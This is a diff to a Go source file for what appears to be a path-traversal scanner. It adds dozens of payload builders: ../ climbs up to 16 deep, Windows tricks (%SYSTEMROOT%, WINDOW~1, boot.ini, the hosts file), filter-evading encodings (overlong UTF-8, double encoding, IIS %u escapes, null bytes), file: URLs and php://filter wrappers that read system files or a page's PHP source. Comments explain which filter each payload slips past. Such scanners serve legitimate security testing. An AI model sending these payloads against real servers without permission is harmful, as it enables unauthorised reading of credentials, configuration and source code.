@@ -60,21 +60,26 @@ func repeatSeq(step string, n int) string {
 	return strings.Repeat(step, n)
 }
 
-// classicModule holds plain "../" sequences. Depths 1, 4, and 8 cover a file
+// classicModule holds plain "../" sequences. Depths 1 through 16 cover a file
 // directly under the app's directory, a fixed-depth prefix, and an unknown
-// depth where extra ../ steps are clamped at the filesystem root.
+// depth where extra ../ steps are clamped at the filesystem root. The /proc
+// entry checks the same climb against a second file.
 var classicModule = module{
 	moduleMeta: moduleMeta{id: "classic-traversal", name: "Path traversal: ../ sequences", severity: "high"},
 	payloads: []payload{
 		{name: "../ x1", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 1) + f }},
+		{name: "../ x2", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 2) + f }},
 		{name: "../ x4", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 4) + f }},
 		{name: "../ x8", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 8) + f }},
+		{name: "../ x16", target: unixTarget, build: func(f string, _ point) string { return repeatSeq("../", 16) + f }},
+		{name: "../ x4 proc/version", target: "proc/version", build: func(f string, _ point) string { return repeatSeq("../", 4) + f }},
 	},
 }
 
 // windowsModule covers Windows path handling: backslash and mixed separators,
-// absolute drive paths, and the 8.3 short name WINDOW~1, which slips past
-// filters that look for the literal word "windows".
+// absolute drive paths, the 8.3 short name WINDOW~1 which slips past filters
+// that look for the literal word "windows", environment-variable prefixes, and
+// the other Windows files that default installs leave readable.
 var windowsModule = module{
 	moduleMeta: moduleMeta{id: "windows-traversal", name: "Path traversal: Windows separators and paths", severity: "high"},
 	payloads: []payload{
@@ -102,11 +107,35 @@ var windowsModule = module{
 		{name: `WINDOW~1 short name`, target: windowsTarget, build: func(f string, _ point) string {
 			return repeatSeq(`..\`, 4) + `WINDOW~1\` + winPath(f)
 		}},
+		// A root-relative path with forward slashes, which an app that only
+		// rejects drive letters and ".." still opens.
+		{name: `/windows/ root-relative`, target: windowsTarget, build: func(f string, _ point) string {
+			return "/windows/" + f
+		}},
+		// %SYSTEMROOT% is expanded by some Windows handlers (old ASP, CGI
+		// wrappers), so this reads the same file without any "..".
+		{name: `%SYSTEMROOT%\ variable`, target: windowsTarget, build: func(f string, _ point) string {
+			return `%SYSTEMROOT%\` + winPath(f)
+		}},
+		// Four dots and a backslash: a filter that strips one "..\" leaves a
+		// working "..\" behind.
+		{name: `....\ x4`, target: windowsTarget, build: func(f string, _ point) string {
+			return repeatSeq(`....\`, 4) + "windows" + `\` + winPath(f)
+		}},
+		{name: `C:\ absolute boot.ini`, target: "boot.ini", build: func(f string, _ point) string {
+			return `C:\` + winPath(f)
+		}},
+		{name: `..\ x4 hosts file`, target: "system32/drivers/etc/hosts", build: func(f string, _ point) string {
+			return repeatSeq(`..\`, 4) + "windows" + `\` + winPath(f)
+		}},
 	},
 }
 
 // encodedModule covers encodings that get past filters which decode once,
 // check for "../" literally, or only strip one occurrence of the sequence.
+// Query and form values are written raw (see rawValueFor), so each payload
+// reaches the app exactly as its text here, and the app's one decode turns
+// it into the traversal the encoding was built for.
 var encodedModule = module{
 	moduleMeta: moduleMeta{id: "encoded-traversal", name: "Path traversal: encoded and filter-evading sequences", severity: "high"},
 	payloads: []payload{
@@ -133,6 +162,10 @@ var encodedModule = module{
 		{name: "%e0%80%ae overlong UTF-8 x4", target: unixTarget, build: func(f string, _ point) string {
 			return repeatSeq("%e0%80%ae%e0%80%ae%e0%80%af", 4) + encodeSlash(f, "%e0%80%af")
 		}},
+		// Dots written as overlong UTF-8 with the slash left as a plain "/".
+		{name: "..%c0%af overlong slash x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("..%c0%af", 4) + encodeSlash(f, "%c0%af")
+		}},
 		// Fullwidth solidus U+FF0F, which some normalizers fold into "/".
 		{name: "..%ef%bc%8f fullwidth solidus x4", target: unixTarget, build: func(f string, _ point) string {
 			return repeatSeq("..%ef%bc%8f", 4) + encodeSlash(f, "%ef%bc%8f")
@@ -142,10 +175,40 @@ var encodedModule = module{
 		{name: "..%255c double-encoded backslash x4", target: unixTarget, build: func(f string, _ point) string {
 			return repeatSeq("..%255c", 4) + encodeSlash(f, "%255c")
 		}},
+		// Encoded backslash: the app decodes %5c into a separator on Windows
+		// stacks, but a filter that checks for "/" alone never sees one.
+		{name: "..%5c backslash x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("..%5c", 4) + encodeSlash(f, "%5c")
+		}},
+		// IIS overlong backslash: 0xC1 0x9C decodes to "\" in lenient IIS.
+		{name: "..%c1%9c overlong backslash x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("..%c1%9c", 4) + encodeSlash(f, "%c1%9c")
+		}},
 		// Only the slash encoded, dots literal: catches filters that look at
 		// encoded dots alone.
 		{name: "..%2f slash-only encoded x4", target: unixTarget, build: func(f string, _ point) string {
 			return repeatSeq("..%2f", 4) + f
+		}},
+		// Double-encoded slash with literal dots: a filter that decodes once
+		// sees "..%2f", which is not a traversal until the second decode.
+		{name: "..%252f double-encoded slash x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("..%252f", 4) + encodeSlash(f, "%252f")
+		}},
+		// Encoded dots and a backslash, for stacks that decode dots only.
+		{name: "%2e%2e%5c encoded dots and backslash x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("%2e%2e%5c", 4) + encodeSlash(f, "%5c")
+		}},
+		// IIS unicode escapes: %uff0e is a fullwidth ".", %u2215 a division
+		// slash, and %u2216 a set minus, which some IIS builds read as "\".
+		// These are not valid percent escapes, so they are sent raw (see newRequest).
+		{name: "%uff0e%uff0e%u2215 IIS unicode x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("%uff0e%uff0e%u2215", 4) + encodeSlash(f, "%u2215")
+		}},
+		{name: "..%u2215 IIS unicode slash x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("..%u2215", 4) + encodeSlash(f, "%u2215")
+		}},
+		{name: "%uff0e%uff0e%u2216 IIS unicode backslash x4", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("%uff0e%uff0e%u2216", 4) + encodeSlash(f, "%u2216")
 		}},
 		// Non-recursive filter bypass: a single stripping pass turns "....//"
 		// into "../".
@@ -170,6 +233,11 @@ var encodedModule = module{
 		{name: "%00.pdf null-byte suffix", target: unixTarget, build: func(f string, _ point) string {
 			return repeatSeq("../", 8) + f + "%00.pdf"
 		}},
+		// The same truncation with nothing after the NUL, for apps that
+		// append a fixed extension themselves.
+		{name: "%00 bare null byte x8", target: unixTarget, build: func(f string, _ point) string {
+			return repeatSeq("../", 8) + f + "%00"
+		}},
 	},
 }
 
@@ -182,6 +250,9 @@ var absoluteModule = module{
 		{name: "//etc/passwd", target: unixTarget, build: func(f string, _ point) string { return "//" + f }},
 		{name: "file:///etc/passwd", target: unixTarget, build: func(f string, _ point) string { return "file:///" + f }},
 		{name: "file://localhost/etc/passwd", target: unixTarget, build: func(f string, _ point) string { return "file://localhost/" + f }},
+		// A single slash after "file:", which some URL parsers accept.
+		{name: "file:/etc/passwd", target: unixTarget, build: func(f string, _ point) string { return "file:/" + f }},
+		{name: "file:///C:/windows/win.ini", target: windowsTarget, build: func(f string, _ point) string { return "file:///C:/windows/" + f }},
 	},
 }
 
@@ -200,8 +271,20 @@ var phpWrapperModule = module{
 		{name: "php://filter base64 absolute", target: unixTarget, build: func(f string, _ point) string {
 			return "php://filter/convert.base64-encode/resource=/" + f
 		}},
+		{name: "php://filter read= base64 absolute", target: unixTarget, build: func(f string, _ point) string {
+			return "php://filter/read=convert.base64-encode/resource=/" + f
+		}},
 		{name: "php://filter base64 %2e%2e%2f x4", target: unixTarget, build: func(f string, _ point) string {
 			return "php://filter/convert.base64-encode/resource=" + repeatSeq("%2e%2e%2f", 4) + encodeSlash(f, "%2f")
+		}},
+		// "....//" collapses to "../" in one non-recursive strip.
+		{name: "php://filter base64 ....// x4", target: unixTarget, build: func(f string, _ point) string {
+			return "php://filter/convert.base64-encode/resource=" + repeatSeq("....//", 4) + f
+		}},
+		// No traversal at all: the app's own source file, read as base64. This
+		// finds the PHP source of the page under test.
+		{name: "php://filter base64 index.php source", target: "index.php", build: func(f string, _ point) string {
+			return "php://filter/convert.base64-encode/resource=" + f
 		}},
 	},
 }
